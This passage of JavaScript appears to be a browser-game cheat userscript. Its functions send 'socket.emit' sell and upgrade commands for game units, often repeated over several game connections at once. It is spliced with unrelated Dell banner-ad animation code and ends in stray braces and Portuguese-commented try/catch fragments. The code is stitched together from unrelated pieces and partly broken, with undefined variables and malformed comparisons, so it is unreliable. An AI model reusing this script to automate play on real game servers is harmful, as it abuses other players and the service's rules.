    if (!window.sockets) return alert("no sockets");
    window.sockets.forEach(socket => {
  for(var a = [], d = 0; d < units.length; ++d){
    if(units[d].type === 0 && getUnitFromPath(units[d].uPath).name === 'Ranged Turret'){
    a.push(units[d].id);
    socket.emit("3", a);
    }
  }
            })
 
        }
 
 
window.SellSpotterTurret=()=>{
 for(var a = [], d = 0; d < units.length; ++d){
     if(units[d].type === 0 && getUnitFromPath(units[d].uPath).name === 'Spotter Turret'){
    a.push(units[d].id);
    socket.emit("3", a);
     }
 }
    if (!window.sockets) return alert("no sockets");
    window.sockets.forEach(socket => {
 for(var a = [], d = 0; d < units.length; ++d){
     if(units[d].type === 0 && getUnitFromPath(units[d].uPath).name === 'Spotter Turret'){
    a.push(units[d].id);
    socket.emit("3", a);
     }
 }
            })
 
        }
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
window.UpgradeBoulder=()=>{
     for (var i = 0; i < units.length; ++i) {
if(3 == units[i].type && "circle" == units[i].shape){
            socket.emit("4", units[i].id, 0)
  }
}
    if (!window.sockets) return alert("no sockets");
    window.sockets.forEach(socket => {
 
     for (var i = 0; i < units.length; ++i) {
if(3 == units[i].type && "circle" == units[i].shape){
            socket.emit("4", units[i].id, 0)
}
}
 
 
})
}
 
 
 
window.UpgradeSpotterTurret=()=>{
 for (var i = 0; i < units.length; ++i){
     if(0 == units[i].type && 3 == units[i].turretIndex && "circle" == units[i].shape){
         socket.emit("4", units[i].id, 0)
     }
 }
 
    if (!window.sockets) return alert("no sockets");
    window.sockets.forEach(socket => {
for (var i = 0; i < units.length; ++i){
     if(0 == units[i].type && 3 == units[i].turretIndex && "circle" == units[i].shape){
         socket.emit("4", units[i].id, 0)
     }
}
            })
        }
 
 
 
window.UpgradeRangedTurret=()=>{
 
  for (var i = 0; i < units.length; ++i){
      if(0 == units[i].type && 1 == units[i].turretIndex && "circle" == units[i].shape){
          socket.emit("4", units[i].id, 1)
      }
}
 
    if (!window.sockets) return alert("no sockets");
    window.sockets.forEach(socket => {
  for (var i = 0; i < units.length; ++i){
      if(0 == units[i].type && 1 == units[i].turretIndex && "circle" == units[i].shape){
          socket.emit("4", units[i].id, 1)
      }
}
            })
 
        }
 
 
 
window.UpgradeGatlinTurret=()=>{
 for (var i = 0; i < units.length; ++i){
     if(0 == units[i].type && 2 == units[i].turretIndex && "circle" == units[i].shape){
         socket.emit("4", units[i].id, 0)
     }
}
 
 
 
    if (!window.sockets) return alert("no sockets");
    window.sockets.forEach(socket => {
 
         for (var i = 0; i < units.length; ++i){
     if(0 == units[i].type && 2 == units[i].turretIndex && "circle" == units[i].shape){
         socket.emit("4", units[i].id, 0)
     }
}
            })
        }
 
 
 
window.UpgradeRapidTurret=()=>{
    for (var i = 0; i < units.length; ++i){
        if(0 == units[i].type && 1 == units[i].turretIndex && "circle" == units[i].shape){
            socket.emit("4", units[i].id, 0)
        }
}
    if (!window.sockets) return alert("no sockets");
    window.sockets.forEach(socket => {
    for (var i = 0; i < units.length; ++i){
        if(0 == units[i].type && 1 == units[i].turretIndex && "circle" == units[i].shape){
            socket.emit("4", units[i].id, 0)
        }
}
            })
        }
 
 
 
window.UpgradeAntiTankGun=()=>{
 
for (var i = 0; i < units.length; ++i){
    if(0 == units[i].type && 4 == units[i].turretIndex && "circle" == units[i].shape){
        socket.emit("4", units[i].id, 1)
    }
}
 
    if (!window.sockets) return alert("no sockets");
    window.sockets.forEach(socket => {
 
        for (var i = 0; i < units.length; ++i){
    if(0 == units[i].type && 4 == units[i].turretIndex && "circle" == units[i].shape){
        socket.emit("4", units[i].id, 1)
    }
}
            })
        }
 
 
window.UpgradeSemiAutoSniper=()=>{
   for (var i = 0; i < units.length; ++i){
       if(0 == units[i].type && 4 == units[i].turretIndex && "circle" == units[i].shape){
           socket.emit("4", units[i].id, 0)
       }
}
 
    if (!window.sockets) return alert("no sockets");
    window.sockets.forEach(socket => {
   for (var i = 0; i < units.length; ++i){
       if(0 == units[i].type && 4 == units[i].turretIndex && "circle" == units[i].shape){
           socket.emit("4", units[i].id, 0)
       }
}
            })
        }
 
 
 
window.UpgradeBlitzFactory =()=>{
     for (var i = 0; i < units.length; ++i){
         if(2 == units[i].type && "square" == units[i].shape){
             socket.emit("4", units[i].id, 1)
         }
}
 
    if (!window.sockets) return alert("no sockets");
    window.sockets.forEach(socket => {
    for (var i = 0; i < units.length; ++i){
         if(2 == units[i].type && "square" == units[i].shape){
             socket.emit("4", units[i].id, 1)
         }
}
            })
        }
 
 
 
window.UpgradeSiegeFactory=()=>{
 
 for (var i = 0; i < units.length; ++i){
     if(2 == units[i].type && "square" == units[i].shape){
         socket.emit("4", units[i].id, 2)
     }
}
 
    if (!window.sockets) return alert("no sockets");
    window.sockets.forEach(socket => {
 
 for (var i = 0; i < units.length; ++i){
     if(2 == units[i].type && "square" == units[i].shape){
         socket.emit("4", units[i].id, 2)
        }
    }
            })
        }
 
 
 
window.UpgradeTankFactory=()=>{
 for (var i = 0; i < units.length; ++i){
     if(2 == units[i].type && "square" == units[i].shape){
         socket.emit("4", units[i].id, 1)
     }
}
 
    if (!window.sockets) return alert("no sockets");
    window.sockets.forEach(socket => {
 for (var i = 0; i < units.length; ++i){
     if(2 == units[i].type && "square" == units[i].shape){
         socket.emit("4", units[i].id, 1)
     }
}
            })
 
        }
 
 
 
window.UpgradeGreaterBarracks=()=>{
 for (var i = 0; i < units.length; ++i){
     if(2 == units[i].type && "square" == units[i].shape){
         socket.emit("4", units[i].id, 0)
     }
}
 
    if (!window.sockets) return alert("no sockets");
    window.sockets.forEach(socket => {
 for (var i = 0; i < units.length; ++i){
     if(2 == units[i].type && "square" == units[i].shape){
         socket.emit("4", units[i].id, 0)
     }
}
            })
        }
 
 
 
 
window.UpgradeSpikes=()=>{
 for (var i = 0; i < units.length; ++i){
     if(3 == units[i].type && "hexagon" == units[i].shape){
         socket.emit("4", units[i].id, 0)
     }
}
    if (!window.sockets) return alert("no sockets");
    window.sockets.forEach(socket => {
 for (var i = 0; i < units.length; ++i){
     if(3 == units[i].type && "hexagon" == units[i].shape){
         socket.emit("4", units[i].id, 0)
     }
}
            })
        }
 
 
 
window.UpgradePowerPlant=()=>{
 
 for (var i = 0; i < units.length; ++i){
    if( 0 == units[i].type && "hexagon" == units[i].shape){
        socket.emit("4", units[i].id, 0)
    }
 }
    if (!window.sockets) return alert("no sockets");
    window.sockets.forEach(socket => {
 for (var i = 0; i < units.length; ++i){
    if( 0 == units[i].type && "hexagon" == units[i].shape){
        socket.emit("4", units[i].id, 0)
    }
 }
            })
        }
 
 
 
window.UpgradeMicroGenerator=()=>{
 
   for (var i = 0; i < units.length; ++i){
       if(3 == units[i].type && "circle" == units[i].shape){
           socket.emit("4", units[i].id, 1)
       }
   }
    if (!window.sockets) return alert("no sockets");
    window.sockets.forEach(socket => {
 
         for (var i = 0; i < units.length; ++i){
       if(3 == units[i].type && "circle" == units[i].shape){
           socket.emit("4", units[i].id, 1)
       }
   }
            })
        }
 
 
 
window.tankfac=()=>{
  for ( i = 0; i < units.length; ++i){
      if(2 == units[i].type && "square" == units[i].shape){
          socket.emit("4", units[i].id, 1);
      }
  }
 
    if (!window.sockets) return alert("no sockets");
    window.sockets.forEach(socket => {
  for ( i = 0; i < units.length; ++i){
      if(2 == units[i].type && "square" == units[i].shape){
          socket.emit("4", units[i].id, 1);
      }
  }
            })
        }
 
window.siegefac=()=>{
 
   for ( i = 0; i < units.length; ++i){
       if(2 == units[i].type && "square" == units[i].shape ){
           socket.emit("4", units[i].id, 2);
       }
   }
 
    if (!window.sockets) return alert("no sockets");
    window.sockets.forEach(socket => {
  for ( i = 0; i < units.length; ++i){
       if(2 == units[i].type && "square" == units[i].shape ){
           socket.emit("4", units[i].id, 2);
       }
   }
 
 
            })
 
        }
 
 
 
 
 
 
window.soldadoarmory=()=>{
 
     for (var i = 0; i < units.length; ++i){
     if(0 == units[i].type && getUnitFromPath(units[i].uPath).name ==="Armory"){
         socket.emit("4", units[i].id, 0);
     }
}
 
         window.sockets.forEach((socket)=>{
            for (var i = 0; i < units.length; ++i){
    if(0 == units[i].type && getUnitFromPath(units[i].uPath).name ==="Armory"){
        socket.emit("4", units[i].id, 0);
     }
}
            })
 
 
 
        }
 
window.tankarmory=()=>{
     for ( i = 0; i < units.length; ++i){
         if(.0 == units[i].type && "circle" == units[i].shape){
             socket.emit("4", units[i].id, 1) &&
             socket.emit("4", units[i].id, 2)
         socket.emit("4", units[i].id, 3);
         }
     }
 
 
 
    if (!window.sockets) return alert("no sockets");
    window.sockets.forEach(socket => {
     for ( i = 0; i < units.length; ++i){
         if(.0 == units[i].type && "circle" == units[i].shape){
             socket.emit("4", units[i].id, 1) &&
             socket.emit("4", units[i].id, 2)
         socket.emit("4", units[i].id, 3);
         }
     }
            })
 
        }
 
 
var banner = document.getElementById('banner');
var legal = document.getElementById('roll-cta');
 
 
var tl = new TimelineMax({repeat:0, repeatDelay:1.5});
// var .set(element, {vars})
 
window.onload = function() {
 
tl.set(banner, {visibility: "visible"})
 
	/*frame one*/
	.add("frame1")
	.from(".dell-logo,.vendor-logo,.cta, .funding_text", .3, {alpha:0, ease:Linear.easeIn}, "frame1")
	.to(".bg, .funding_text", .3, {alpha:0, ease:Linear.easeOut}, "frame1+=2.5")
 
	/*frame two*/
	.add("frame2","frame1+=2.5")
	.from(".dell-logo2", .3, {alpha:0, ease:Linear.easeIn}, "frame2")
	.staggerTo(".headingf2,.title-2_1,.title-2_2,.title-2_3,.title-2_4", 1, {clip:"rect(0px,700px,30px,0px)", x:10, ease:Expo.easeInOut},0.2, "frame2")
	.staggerTo(".headingf2,.title-2_1,.title-2_2,.title-2_3,.title-2_4", .3, {clip:"rect(0px,0px,30px,0px)", x:-10, ease:Expo.easeIn},0.1, "frame2+=2.5")
	// .to(".dell-logo2", .3, {alpha:0, ease:Linear.easeIn}, "frame2+=2.75")
 
	/*frame three*/
	.add("frame3","frame2+=3")
	// .to(".dell-logo", .3, {alpha:1, ease:Linear.easeIn}, "frame3")
	.from(".product_f3", .5, {y:180, ease: Power1.easeInOut}, "frame3")
	.from(".product_f3b", .5, {y:180, ease: Power1.easeInOut}, "frame3")
	.from(".price-mainbox3", .5, {alpha:0, ease:Expo.easeInOut}, "frame3")
	.to(".product_f3, .price-mainbox3, .product_f3b", .5, {alpha:0, rotation:0.01,  ease:Power4.easeOut}, "frame3+=2.5")
 
	/*frame four*/
	.add("frame4","frame3+=3")
	.from(".product_f4", .5, {y:180, ease: Power1.easeInOut}, "frame4")
	.from(".price-mainbox4, .vendor-logof4, .funding_text_f4", .5, {alpha:0, ease:Expo.easeInOut}, "frame4")
	.from(".badgef4, .callout-f4", .5, {alpha:0, ease:Expo.easeInOut}, "frame4+=.3")
	.from(".vio_textf4", .5, {x:100, ease:Expo.easeInOut}, "frame4+=.5")
	.to(".product_f4,.badgef4, .callout-f4,.vio-boxf4,.pnamef4, .price-mainbox4, .vendor-logof4, .funding_text_f4", .5, {alpha:0, rotation:0.01,  ease:Power4.easeOut}, "frame4+=2.5")
 
	/*frame five*/
	.add("frame5","frame4+=3")
	.to(".funding_text", .5, {alpha:1, ease:Linear.easeIn}, "frame5")
	.from(".headingf5", .5, {alpha:0, ease:Linear.easeIn}, "frame5")
	.from(".price-mainbox5,.vendor-logof5, .funding_text_f5", .5, {alpha:0, ease:Expo.easeInOut}, "frame5")
	.from(".product_f5", .5, {y:180, ease: Power1.easeInOut}, "frame5")
	.from(".badgef5, .callout-f5", .5, {alpha:0, ease:Expo.easeInOut}, "frame5+=.3")
	.from(".vio_textf5", .5, {x:100, ease:Expo.easeInOut}, "frame5+=.5")
 
 
	/*roll over
	.from("#roll-cta", .5, {alpha:0, x:-300, ease:Power4.easeout}, "frame5")
	.from("#rolltext", .5, {alpha:0, ease:Power4.easeout}, "frame5")
	.from("#legal-text", .5, {alpha:0, ease:Power4.easeout}, "frame5")
 
	legal.addEventListener("mouseover",legalHover);
	function legalHover(){
		tl.pause();
		TweenMax.to("#legal", .5, {top:0, ease:Power1.easeOut})
	}
 
	legal.addEventListener("mouseout",legalOut);
	function legalOut(){
		tl.play();
		TweenMax.to("#legal", .5, {top:-1000, ease:Power1.easeIn})
	}
*/
	;
 
//tl.seek().pause(14);
 
	var currentDuration = tl.duration();
	console.log(currentDuration);
 
};
 
 
 
 
//MODO RESTRITO
(function() {
    'use strict';
 
 
 
 
 
})();
//FIM DO MODO RESTRITO
}catch(e){
console.log("Erro: "+e)
}
    },false)<=true
}catch(erro){
alert(erro)
}